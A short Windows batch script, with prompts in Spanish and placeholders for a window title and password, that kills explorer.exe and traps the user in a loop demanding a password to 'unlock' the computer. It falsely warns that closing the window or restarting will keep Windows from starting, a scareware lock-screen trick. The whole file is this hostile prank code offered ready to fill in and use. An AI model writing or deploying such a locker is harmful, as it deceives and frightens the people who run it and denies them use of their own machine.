color 0A
@echo off
title [Titutlo que quiera para la ventana]
taskkill /f /im explorer.exe
:bucle
cls
msg * Lea con atencion. No reinicie el computador
echo =============================================================================
echo Si usted cierra esta ventana,  no podra colocar la contrasena.
echo Si apaga/reinicia el computador, su "Windows" no iniciara correctamente.
echo =============================================================================
set /p pass=Coloque la contrasena para desbloquear el computador: 
if %pass%==[contasena que usted quiera] (goto passcorrect) ELSE (goto bucle)
:passcorrect
echo Felicidades!
start explorer.exe
pause
exit
